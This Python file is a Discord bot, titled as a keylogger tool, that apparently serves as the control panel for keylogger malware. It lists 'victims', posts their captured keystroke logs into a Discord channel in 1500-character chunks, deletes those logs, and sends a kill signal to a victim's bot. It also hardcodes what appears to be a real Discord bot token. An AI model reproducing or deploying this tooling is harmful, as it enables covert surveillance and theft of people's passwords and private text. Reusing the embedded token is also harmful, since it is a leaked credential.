import os
from pathlib import Path
import itertools
import discord
from discord.ext import commands
from os import walk

banner = """

╔╦╗┬┌─┐┌─┐┌─┐┬─┐┌┬┐    ┬┌─┌─┐┬ ┬═╗ ╦┬  ┌─┐┌─┐
 ║║│└─┐│  │ │├┬┘ ││    ├┴┐├┤ └┬┘╔╩╦╝│  │ ││ ┬
═╩╝┴└─┘└─┘└─┘┴└──┴┘────┴ ┴└─┘ ┴ ╩ ╚═┴─┘└─┘└─┘
                          coded by script1337

"""

help = """
command:
       1.$show_victim (Get list of  all victims)
       2.$show_log victim ( show victim logs )
       3.$clear_logs (Clear victims logs)
       4.$suicide (Kill bot)
       5.$shutdown (shutdown the server)

"""

print(banner)

client = commands.Bot(command_prefix='$')


def writelog(content):
    f = open("suicide.log", "a")
    f.write(content)
    f.close()


def createlog(content):
    f = open("suicide.log", "w+")
    f.write(content)
    f.close()


def listToString(s):
    str1 = ""
    x = 1
    for ele in s:
        str1 += str(x) + str(" > ") + ele + "\n"
        x = x + 1
    return str1


@client.event
async def on_ready():
    print('We are ready to Attack...')


@client.command()
async def show_victim(ctx):
    arr = os.listdir('./victim/')
    victim = listToString(arr).replace(".log", "")
    await ctx.send('```' + victim + '```')


@client.command()
async def show_help(ctx):
    await ctx.send('```' + banner + help + '```')


@client.command()
async def suicide(ctx, arg):
    if Path('suicide.log').is_file():
        writelog(arg)
    else:
        createlog(arg)
    await ctx.send('```' + arg + '\'s bot suicide :( ' + '```')


@client.command()
async def clear_log(ctx, arg):
    await ctx.send('```Clearing > ' + arg + '\'s Logs... ```')
    try:
        os.remove("./victim/" + arg + ".log")
    except:
        await ctx.send('```User\'s logs not found ```')


def split_seq(iterable, size):
    it = iter(iterable)
    item = list(itertools.islice(it, size))
    while item:
        yield item
        item = list(itertools.islice(it, size))
        return item
    
@client.command()
async def show_log(ctx, arg):
    try:
        with open('./victim/' + arg + '.log', 'r') as f:
            output = str(f.read().replace("\n"," "))
            #print(output)
            print(len(output))
            if len(output) >= 1500:
                f = lambda x, n, acc=[]: f(x[n:], n, acc+[(x[:n])]) if x else acc
                data_list = f(output,1500)
                for i in data_list:
                    await ctx.send('```' + str(i) + '```')
            else:
                await ctx.send('```' + output + '```')
    except Exception as e:
        await ctx.send('```' + str(e) + str("\x90"*100) + '```')


@client.command()
async def shutdown(ctx):
    await ctx.send('```server going down...```')
    exit(0)


client.run('NzA1NzM4NjU5MDc2NTA1NjYw.Xq001g.RWROF4fuit-NVi13FWhtMgfzdyw')
